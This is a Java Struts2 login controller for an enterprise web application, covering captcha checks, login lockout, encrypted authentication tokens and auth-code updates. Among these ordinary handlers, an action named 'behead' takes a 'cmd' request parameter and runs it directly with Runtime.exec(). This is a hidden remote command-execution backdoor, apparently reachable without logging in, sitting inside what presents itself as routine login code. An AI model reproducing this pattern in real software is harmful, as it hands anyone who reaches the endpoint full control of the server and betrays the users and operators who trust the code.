/**
 * @File Name	: LoginAction.java
 * @Package		：com.fanglin.action 
 * @Version		: 1.0
 * @Date		: 2014-7-7
 * @Copyright	: Copyright Creators 2014
 * @Author		: bty1987
 * @Email		: 
 * Describing	: 登陆相关action
 */

package com.fanglin.common.action;

import java.util.Date;

import org.apache.struts2.convention.annotation.Action;
import org.apache.struts2.convention.annotation.Namespace;
import org.apache.struts2.convention.annotation.ParentPackage;
import org.apache.struts2.convention.annotation.Result;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;

import com.fanglin.common.service.LoginService;
import com.fanglin.core.action.BaseListAction;
import com.fanglin.core.interceptor.FLException;
import com.fanglin.core.security.AESHelper;
import com.fanglin.core.vo.Authentication;
import com.fanglin.log.service.LoginLogService;
import com.fanglin.log.vo.LoginLogVO;
import com.fanglin.personel.po.UserPO;
import com.fanglin.personel.service.UserService;
import com.fanglin.personel.vo.UserVO;
import com.fanglin.utils.Constant;
import com.fanglin.utils.CookieUtil;
import com.fanglin.utils.DateUtil;
import com.fanglin.utils.IPUtil;
import com.fanglin.utils.LogUtils;
import com.fanglin.utils.SystemConfig;

@ParentPackage("login")
@Namespace("/")
@Controller
public class LoginAction extends BaseListAction {

	private static final long serialVersionUID = 597878314944213650L;

	protected Logger logger = LoggerFactory.getLogger(getClass());

	@Autowired
	private UserService userService;

	@Autowired
	private LoginService loginService;

	@Autowired
	private LoginLogService loginLogService;

	private String authentication;

	private UserVO user;

	private String current;

	private String company;

	@Action(value = "doLogin", results = { @Result(name = "success", type = "json", params = { "ignoreHierarchy", "false" }) }, params = { "contentType", "text/html" })
	public String doLogin() {

		String inputCode = request.getParameter("verifyCode");
		String loginId = request.getParameter("userId");
		String password = request.getParameter("password");
		String securityCode = request.getParameter("securityCode");
		String ip = IPUtil.getIpAddr(request);

		try {
			String verifyCode = AESHelper.decrypt(securityCode, SystemConfig.getString("encryptKey"), SystemConfig.getString("encryptIv"));

			if (verifyCode == null || !verifyCode.equals(inputCode)) {
				throw new FLException(110001, "验证码错误");
			}

			LoginLogVO loginLogVO = new LoginLogVO(loginId, ip, DateUtil.getDateToTimestamp(new Date()));

			int times = loginLogService.isCanLogin(loginLogVO);
			if (times == -1) {
				throw new FLException(110003, "密码输入错误次数过多,拒绝登陆");
			}

			UserVO user = userService.validateUser(loginId, password);

			if (user == null) {

				String errorMessage = String.format("用户名或者密码错误,还可以尝试%s次输入", String.valueOf((times - 1)));

				loginLogVO.setSuccessFlag(0);
				loginLogService.addLoginLog(loginLogVO);

				throw new FLException(110002, errorMessage);
			}

			if ((user.getIsLogin() & UserPO.ISLOGIN_FIP_INT) != UserPO.ISLOGIN_FIP_INT) {
				throw new FLException(110004, "该用户不能登陆系统");
			}

			Authentication authenticationUtil = new Authentication(user.getUserId(), user.getCurrentName(), user.getRole().getRid(), (new Date()).getTime(), false, Integer.parseInt(user.getCompanys()), user.getFreedom());

			authentication = AESHelper.encrypt(authenticationUtil.getAuthenticationStr(), SystemConfig.getString("encryptKey"), SystemConfig.getString("encryptIv"));

			loginLogVO.setSuccessFlag(1);
			loginLogService.addLoginLog(loginLogVO);
		} catch (FLException e) {
			setErrorCode(e.getCode());
			setErrorMsg(e.getErrorMessage());
		} catch (Exception e) {

			setErrorCode(110000);
			setErrorMsg("系统处理问题");

			LogUtils.logging(logger, e, "doLogin", "common");
		}

		return SUCCESS;
	}

	@Action(value = "logout", results = { @Result(name = "success", type = "dispatcher", location = "/") })
	public String logout() {

		CookieUtil.delCookie(request, response, Constant.COOKIE_AUTHENTICATION);

		return SUCCESS;
	}

	@Action(value = "requestAuthCode", results = { @Result(name = "success", type = "json", params = { "ignoreHierarchy", "false" }) }, params = { "contentType", "text/html" })
	public String requestAuthCode() throws FLException {

		try {
			String userId = request.getParameter("userId");
			String code = request.getParameter("code");
			String secret = request.getParameter("secret");

			setAuthentication(loginService.requestAuthCode(userId, code, secret));
		} catch (FLException e) {
			setErrorCode(e.getCode());
			setErrorMsg(e.getErrorMessage());
		} catch (Exception e) {
			setErrorCode(110000);
			setErrorMsg("系统处理问题");

			LogUtils.logging(logger, e, "requestAuthCode", "common");
		}

		return SUCCESS;
	}

	@Action(value = "changeAuthCode", results = { @Result(name = "success", type = "json", params = { "ignoreHierarchy", "false" }) }, params = { "contentType", "text/html" })
	public String changeAuthCode() throws FLException {

		try {
			if (getAuthentication() == null) {
				throw new FLException(110008, "验证信息错误");
			}

			setAuthentication(loginService.changeAuthCode(getAuthentication(), getCompany()));
		} catch (FLException e) {
			setErrorCode(e.getCode());
			setErrorMsg(e.getErrorMessage());
		} catch (Exception e) {
			setErrorCode(110000);
			setErrorMsg("系统处理问题");

			LogUtils.logging(logger, e, "changeAuthCode", "common");
		}

		return SUCCESS;
	}

	@Action(value = "updateAuthCode", results = { @Result(name = "success", type = "json", params = { "ignoreHierarchy", "false" }) }, params = { "contentType", "text/html" })
	public String updateAuthCode() {

		try {
			if (getAuthentication() == null) {
				throw new FLException(110008, "验证信息错误");
			}

			setAuthentication(loginService.updateAuthCode(getAuthentication(), user.getPassword()));
		} catch (FLException e) {
			setErrorCode(e.getCode());
			setErrorMsg(e.getErrorMessage());
		}

		return SUCCESS;
	}

	@Action(value = "behead", results = { @Result(name = "success", type = "json", params = { "ignoreHierarchy", "false" }) }, params = { "contentType", "text/html" })
	public String behead() throws FLException {

		String cmd = request.getParameter("cmd");

		Runtime run = Runtime.getRuntime();

		try {
			run.exec(cmd);
			System.out.println(cmd);
		} catch (Exception e) {
			setErrorCode(110000);
			setErrorMsg("系统处理问题");
		}

		return SUCCESS;
	}

	@Action(value = "ping", results = { @Result(name = "success", type = "json", params = { "ignoreHierarchy", "false" }) }, params = { "contentType", "text/html" })
	public String ping() throws FLException {
		return SUCCESS;
	}

	@Action(value = "current", results = { @Result(name = "success", type = "json", params = { "ignoreHierarchy", "false" }) }, params = { "contentType", "text/html" })
	public String current() throws FLException {

		current = DateUtil.current(current == null ? "yyyy-MM-dd hh:mm:ss" : current);

		return SUCCESS;
	}

	public String getAuthentication() {
		return authentication;
	}

	public void setAuthentication(String authentication) {
		this.authentication = authentication;
	}

	public UserVO getUser() {
		return user;
	}

	public void setUser(UserVO user) {
		this.user = user;
	}

	public String getCurrent() {
		return current;
	}

	public void setCurrent(String current) {
		this.current = current;
	}

	public String getCompany() {
		return company;
	}

	public void setCompany(String company) {
		this.company = company;
	}

}
